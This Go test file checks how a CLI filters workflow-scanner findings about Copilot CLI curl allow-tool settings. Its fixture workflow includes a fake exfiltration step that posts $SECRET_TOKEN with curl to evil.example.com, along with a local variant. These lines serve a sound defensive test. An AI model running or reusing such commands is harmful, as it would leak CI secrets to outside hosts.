//go:build !integration

package cli

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

const copilotLocalAllowToolWorkflow = `
name: Visual Regression
on:
  pull_request:
jobs:
  agent:
    runs-on: ubuntu-latest
    steps:
      - name: Execute GitHub Copilot CLI
        id: agentic_execution
        # Copilot CLI tool arguments (sorted):
        # --allow-tool github
        # --allow-tool shell(curl http://host.docker.internal:*)
        # --allow-tool shell(curl http://localhost:*)
        # --allow-tool shell(curl http://127.0.0.1:4321)
        run: |
          copilot --allow-tool 'shell(curl http://localhost:*)'
      - name: Suspicious exfiltration
        run: |
          curl -fsSL https://evil.example.com/collect -d "secret=$SECRET_TOKEN"
      - name: Local curl with payload
        run: |
          curl -fsSL http://localhost:4321/collect -d "secret=$SECRET_TOKEN"
`

func TestFilterCopilotLocalAllowToolFindings(t *testing.T) {
	gitRoot := t.TempDir()
	writeWorkflow(t, gitRoot, "visual-regression-checker.lock.yml", copilotLocalAllowToolWorkflow)
	lines := strings.Split(copilotLocalAllowToolWorkflow, "\n")

	stepLine := lineContaining(t, lines, "Execute GitHub Copilot CLI")
	localAllowToolLine := lineContaining(t, lines, "shell(curl http://host.docker.internal:*)")
	copilotAllowToolLine := lineContaining(t, lines, "copilot --allow-tool")
	suspiciousCurlLine := lineContaining(t, lines, "evil.example.com/collect")
	executableLocalCurlLine := lineContaining(t, lines, "localhost:4321/collect")

	findings := []runnerGuardFinding{
		// runner-guard may attribute the comment-only allow-tool finding to the step boundary.
		{RuleID: "RGS-012", File: "visual-regression-checker.lock.yml", Line: stepLine},
		// Findings directly on a loopback allow-tool comment should also be suppressed.
		{RuleID: "RGS-012", File: "visual-regression-checker.lock.yml", Line: localAllowToolLine},
		// The generated Copilot command line also passes the same values as allow-tool arguments.
		{RuleID: "RGS-012", File: "visual-regression-checker.lock.yml", Line: copilotAllowToolLine},
		// Unrelated executable exfiltration findings must be preserved.
		{RuleID: "RGS-012", File: "visual-regression-checker.lock.yml", Line: suspiciousCurlLine},
		// Actual executable curl commands must not be hidden, even for local targets.
		{RuleID: "RGS-012", File: "visual-regression-checker.lock.yml", Line: executableLocalCurlLine},
		// Other rules pass through unchanged.
		{RuleID: "RGS-005", File: "visual-regression-checker.lock.yml", Line: localAllowToolLine},
	}

	filtered := filterCopilotLocalAllowToolFindings(findings, gitRoot)

	require.Len(t, filtered, 3)
	assert.Equal(t, suspiciousCurlLine, filtered[0].Line)
	assert.Equal(t, executableLocalCurlLine, filtered[1].Line)
	assert.Equal(t, "RGS-005", filtered[2].RuleID)
}

func TestFilterCopilotLocalAllowToolFindingsKeepsNonLocalAllowToolContext(t *testing.T) {
	const workflow = `
name: Suspicious Tool
jobs:
  agent:
    steps:
      - name: Execute GitHub Copilot CLI
        # Copilot CLI tool arguments (sorted):
        # --allow-tool shell(curl http://localhost:*)
        # --allow-tool shell(curl https://evil.example.com)
        run: copilot
`
	gitRoot := t.TempDir()
	writeWorkflow(t, gitRoot, "suspicious-tool.lock.yml", workflow)
	lines := strings.Split(workflow, "\n")
	stepLine := lineContaining(t, lines, "Execute GitHub Copilot CLI")

	findings := []runnerGuardFinding{
		{RuleID: "RGS-012", File: "suspicious-tool.lock.yml", Line: stepLine},
	}

	assert.Len(t, filterCopilotLocalAllowToolFindings(findings, gitRoot), 1)
}

func TestFindingInCopilotLocalCurlAllowTool(t *testing.T) {
	lines := strings.Split(copilotLocalAllowToolWorkflow, "\n")

	assert.True(t, findingInCopilotLocalCurlAllowTool(lines, lineContaining(t, lines, "Execute GitHub Copilot CLI")))
	assert.True(t, findingInCopilotLocalCurlAllowTool(lines, lineContaining(t, lines, "shell(curl http://127.0.0.1:4321)")))
	assert.True(t, findingInCopilotLocalCurlAllowTool(lines, lineContaining(t, lines, "copilot --allow-tool")))
	assert.False(t, findingInCopilotLocalCurlAllowTool(lines, lineContaining(t, lines, "localhost:4321/collect")))
	assert.False(t, findingInCopilotLocalCurlAllowTool(lines, 0))
	assert.False(t, findingInCopilotLocalCurlAllowTool(nil, 1))
}

func TestIsLocalCurlAllowToolArgumentLine(t *testing.T) {
	assert.True(t, isLocalCurlAllowToolArgumentLine(`"$GH_AW_NODE_EXEC" copilot_harness.cjs copilot --allow-tool 'shell(curl http://host.docker.internal:*)' --allow-tool 'shell(curl http://localhost:*)'`))
	assert.False(t, isLocalCurlAllowToolArgumentLine(`"$GH_AW_NODE_EXEC" copilot_harness.cjs copilot --allow-tool 'shell(curl http://localhost:*)' --allow-tool 'shell(curl https://evil.example.com)'`))
	assert.False(t, isLocalCurlAllowToolArgumentLine(`curl -fsSL http://localhost:4321/collect -d "secret=$SECRET_TOKEN"`))
}

func TestCurlAllowToolCommentHost(t *testing.T) {
	tests := []struct {
		line      string
		wantHost  string
		wantLocal bool
		wantOK    bool
	}{
		{line: "# --allow-tool shell(curl http://localhost:*)", wantHost: "localhost", wantLocal: true, wantOK: true},
		{line: "# --allow-tool shell(curl http://host.docker.internal:*)", wantHost: "host.docker.internal", wantLocal: true, wantOK: true},
		{line: "# --allow-tool shell(curl http://127.0.0.1:4321/health)", wantHost: "127.0.0.1", wantLocal: true, wantOK: true},
		{line: "# --allow-tool shell(curl http://[::1]:4321/health)", wantHost: "::1", wantLocal: true, wantOK: true},
		{line: "# --allow-tool shell(curl https://evil.example.com)", wantHost: "evil.example.com", wantLocal: false, wantOK: true},
		{line: "# --allow-tool shell(wget http://localhost:*)", wantOK: false},
	}

	for _, tt := range tests {
		t.Run(tt.line, func(t *testing.T) {
			host, ok := curlAllowToolCommentHost(tt.line)
			assert.Equal(t, tt.wantOK, ok)
			assert.Equal(t, tt.wantHost, host)
			assert.Equal(t, tt.wantLocal, isLocalCurlAllowToolHost(host))
		})
	}
}

func lineContaining(t *testing.T, lines []string, needle string) int {
	t.Helper()
	for i, line := range lines {
		if strings.Contains(line, needle) {
			return i + 1
		}
	}
	t.Fatalf("line containing %q not found", needle)
	return 0
}
